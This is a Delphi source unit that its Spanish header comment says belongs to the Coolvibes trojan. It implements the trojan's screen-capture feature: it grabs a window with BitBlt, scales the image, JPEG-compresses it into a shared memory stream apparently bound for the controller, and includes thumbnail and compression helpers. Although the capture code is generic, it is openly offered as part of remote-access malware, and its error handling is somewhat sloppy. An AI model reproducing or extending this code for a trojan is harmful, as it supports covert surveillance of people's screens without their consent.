{Unit perteneciente al troyano Coolvibes que contiene todas las funciones
que son usadas en la captura de pantalla}
unit unitCapScreen;

interface

uses
  Windows,
  SysUtils,
  Graphics,
  Jpeg,
  Classes,
  lomlib,
  UnitVariables,
  UnitFunciones;

procedure pantallazo(NivelCompresion, width, height : integer; const AHandle: THandle);    //realiza capturas del tamaño deseado
function comprimir_jpeg(InputFile, OutputFile:AnsiString; quality:integer):boolean;
function GenerateThumb(filename:string;width:integer;height:integer;calidad:integer):boolean;

implementation

function GenerateThumb(filename:string;width:integer;height:integer;calidad:integer):boolean;
var
  Jpg: TjpegImage;
  fBitmap,nbitmap: TBitmap;
  error : boolean;
begin
   if not fileexists(filename) then
   begin
    Result := false;
    exit;
   end;


  fbitmap:=TBitmap.Create;


  error := false;
  try
    fbitmap.LoadFromFile(filename);
  except
    error := true;     //OPZ! no es un BMP
  end;

  if error then
  begin
      error := false;
      Jpg := TjpegImage.Create;
    try
      Jpg.LoadFromFile(filename);  //Sera un jpeg??
    except
      error := true;   //pues no asi que...
      result := false;
      exit;            //...Adios!
    end;

    fBitmap.Assign(Jpg);    //SI!! es un JPEG
    Jpg.Free;
  end;

  if(Width = 6666666) then  //tamaño relativo, en la variable height tenemos el procentaje
  begin
    Width := (Height*fbitmap.Width) div 100;
    Height := (Height*fbitmap.Height) div 100;
  end;
  nBitmap := TBitmap.Create;
  nBitmap.Width := round(fBitmap.Width*(width/fbitmap.Width));
  nBitmap.Height := round(fBitmap.Height*(height/fbitmap.Height));
  nBitmap.PixelFormat := pf32bit;
  fBitmap.PixelFormat := pf32bit;

  SetStretchBltMode(nBitmap.Canvas.Handle, HALFTONE);
  StretchBlt(nBitmap.Canvas.Handle, 0, 0, nBitmap.Width, nBitmap.Height, fBitmap.Canvas.Handle, 0, 0, fBitmap.Width, fBitmap.Height, SRCCOPY);
  fbitmap.free;
  Jpg := TjpegImage.Create;
  Jpg.Assign(nBitmap);
  nbitmap.free;
  Jpg.CompressionQuality := calidad;
  Jpg.Compress;
  Jpg.SaveToStream(MS);  //Guardamos a el TmemoryStream
  jpg.free;
  result := true;
end;


procedure pantallazo(NivelCompresion, width, height : integer; const AHandle: THandle);
var
  Jpg: TjpegImage;
  fBitmap, nBitmap: TBitmap;
  DC: HDC;
  Rect: TRect;
begin

  DC := GetDC(AHandle);

  try
    fBitmap := TBitmap.Create;
    try
      if not GetClientRect(AHandle, Rect) then Exit;

      fBitmap.Width := Rect.Right - Rect.Left;
      fBitmap.Height := Rect.Bottom - Rect.Top;
      fBitmap.PixelFormat := pf32bit;
      BitBlt(fBitmap.Canvas.Handle, 0, 0, fBitmap.Width, fBitmap.Height, DC, 0, 0, SRCCOPY);


      nBitmap := TBitmap.Create;
      nBitmap.Width := round(fBitmap.Width*(Width/anchurapantalla()));
      nBitmap.Height := round(fBitmap.Height*(height/alturapantalla()));
      nBitmap.PixelFormat := pf32bit;
      SetStretchBltMode(nBitmap.Canvas.Handle, HALFTONE);
      StretchBlt(nBitmap.Canvas.Handle, 0, 0, nBitmap.Width, nBitmap.Height, fBitmap.Canvas.Handle, 0, 0, fBitmap.Width, fBitmap.Height, SRCCOPY);


    finally
      fBitmap.Free;
     end;
  finally
    ReleaseDC(AHandle, DC);
  end;
  
  try
  Jpg := TjpegImage.Create;
  Jpg.Assign(nBitmap);
  nBitmap.Free;

  Jpg.CompressionQuality := NivelCompresion;
  Jpg.Compress;

 Jpg.SaveToStream(MS);
 finally
 jpg.free;
 end;
end;

procedure CreateThumbnail2(InStream, OutStream: TStream;
  Width, Height: Integer);
var
  JpegImage: TJpegImage;
  Bitmap: TBitmap;
  Ratio: Double;
  ARect: TRect;
  AHeight, AHeightOffset: Integer;
  AWidth, AWidthOffset: Integer;
begin
//  Check for invalid parameters
  if Width<1 then
    raise Exception.Create('Invalid Width');
  if Height<1 then
    raise Exception.Create('Invalid Height');
  JpegImage:=TJpegImage.Create;
  try
//  Load the image
    JpegImage.LoadFromStream(InStream);
// Create bitmap, and calculate parameters
    Bitmap:=TBitmap.Create;
    try
      Ratio:=JpegImage.Width/JpegImage.Height;
      if Ratio>1 then
      begin
        AHeight:=Round(Width/Ratio);
        AHeightOffset:=(Height-AHeight) div 2;
        AWidth:=Width;
        AWidthOffset:=0;
      end
      else
      begin
        AWidth:=Round(Height*Ratio);
        AWidthOffset:=(Width-AWidth) div 2;
        AHeight:=Height;
        AHeightOffset:=0;
      end;
      Bitmap.Width:=Width;
      Bitmap.Height:=Height;
      Bitmap.Canvas.Brush.Color:=clWhite;
      Bitmap.Canvas.FillRect(Rect(0,0,Width,Height));
// StretchDraw original image
      ARect:=Rect(AWidthOffset,AHeightOffset,AWidth+AWidthOffset,AHeight+AHeightOffset);
      Bitmap.Canvas.StretchDraw(ARect,JpegImage);
// Assign back to the Jpeg, and save to the file
      JpegImage.Assign(Bitmap);
      JpegImage.SaveToStream(OutStream);
    finally
      Bitmap.Free;
    end;
  finally
    JpegImage.Free;
  end;
end;

function comprimir_jpeg(InputFile, OutputFile:AnsiString; quality:integer):boolean;
var
  j :TJPegImage;
  Bitmap:TBitmap;
begin
Result := true;
try
j := TJPegImage.Create;
Bitmap := TBitmap.Create;
j.LoadFromFile(InputFile);
Bitmap.Canvas.Draw(0, 0, j);
j.CompressionQuality := quality;
j.Compress;
j.SaveToFile(OutputFile);
//ShowMessage('');
Except on E:Exception do
begin
  Result := false;
  j.free;
  bitmap.Free;
end;
//jpeg.Free;
end;//try-finally
if Result then//no ocurrio ningun error
  j.free;
  bitmap.Free;
begin
end;
end;



end.
